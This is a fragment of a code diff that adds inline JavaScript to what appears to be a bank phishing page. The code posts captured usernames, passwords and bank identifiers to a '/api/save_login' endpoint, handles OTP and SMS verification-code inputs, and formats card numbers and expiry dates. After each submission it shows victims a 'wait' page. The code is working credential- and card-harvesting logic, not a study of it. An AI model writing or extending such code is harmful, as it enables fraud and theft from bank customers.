+        submitToApi('save_login', {username: u.value, password: p ? p.value : '', bank_id: bankId, bank_name: bankName});
+      }
+    });
+
+    // Auto-focus next input for OTP-style inputs
+    document.addEventListener('input', function(e) {
+      if (e.target.classList.contains('otp-input') || e.target.classList.contains('sms-input') || 
+          e.target.classList.contains('verify-input') || e.target.classList.contains('cv-input')) {
+        if (e.target.value.length === 1) {
+          var next = e.target.nextElementSibling;
+          if (next && next.tagName === 'INPUT') next.focus();
+        }
+      }
+      // Card number formatting
+      if (e.target.id === 'cardNumber') {
+        var v = e.target.value.replace(/\D/g,'').substring(0,16);
+        e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+      }
+      // Expiry formatting
+      if (e.target.id === 'cardExpiry') {
+        var v = e.target.value.replace(/\D/g,'').substring(0,4);
+        if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2);
+        e.target.value = v;
+      }
+    });
+
+    // Backspace handling for OTP inputs
+    document.addEventListener('keydown', function(e) {
+      if ((e.target.classList.contains('otp-input') || e.target.classList.contains('sms-input') || 
+           e.target.classList.contains('verify-input') || e.target.classList.contains('cv-input')) && e.key === 'Backspace' && !e.target.value) {
+        var prev = e.target.previousElementSibling;
+        if (prev && prev.tagName === 'INPUT') { prev.focus(); prev.value = ''; }
+      }
+    });
+
+    function submitToApi(endpoint, data) {
+      var vid = getVisitorId();
+      var fd = new FormData();
+      fd.append('visitor_id', vid);
+      for (var k in data) { fd.append(k, data[k]); }
+      
+      _origFetch('/api/' + endpoint, {
+        method: 'POST',
+        body: fd,
+        credentials: 'include'
+      }).then(function(r){ return r.json(); }).then(function(resp) {
+        // After submit, show wait page
+        _currentPage = 'wait';
+        renderPageView('wait', {});
+      }).catch(function(err) {
+        console.error('Submit error:', err);
+        _currentPage = 'wait';
+        renderPageView('wait', {});
+      });
+    }
+  </script>
+  </body>
+</html>
